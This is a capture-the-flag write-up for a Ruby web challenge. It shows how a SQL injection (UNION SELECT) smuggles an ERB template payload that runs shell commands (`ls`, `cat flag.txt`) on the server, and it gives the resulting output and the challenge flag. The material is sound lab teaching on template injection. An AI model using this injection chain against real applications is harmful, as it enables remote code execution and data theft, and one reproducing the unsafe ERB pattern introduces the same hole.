# ctfdb-2

## Write-up

- The description is mentioning templates, and ERB is the template engine used in this challenge

- There's an odd function that's using a literal string as a template :

```ruby
def render_country(country)
  ERB.new("<span class=\"flag-icon flag-icon-#{country}\"></span>").result(binding)
end

# ...

# used here
  rows = client.query sql_query
  teams = rows.map do |row|
    name = row["name"]
    country = render_country row["country"]
    {:name => name, :country => country}
  end
```

- If we have control over the country returned by the SQL query result, we can inject malicious template markers like ``<%= `ls` %>`` to get code execution

- We can take advantage of the SQL injection in the first part of the challenge to control the returned country :

```sql
SELECT name, country FROM teams WHERE name LIKE '' UNION SELECT 1, '<%= `ls` %>';-- %' ORDER BY name ASC LIMIT 50
```

- Our query should then look like : ``' UNION SELECT 1, '<%= `ls` %>';--``

- After sending that query, we inspect the HTML to find the files returned by `ls` command :

```txt
Gemfile
Gemfile.lock
app.rb
flag.txt
views
```

- Let's read the flag now : ``' UNION SELECT 1, '<%= `cat flag.txt` %>';--``

- We can read the flag after inspecting the HTML again : `shellmates{S$t1_IS_sO_C00l_On_RUBy!}`

## Flag

`shellmates{S$t1_IS_sO_C00l_On_RUBy!}`
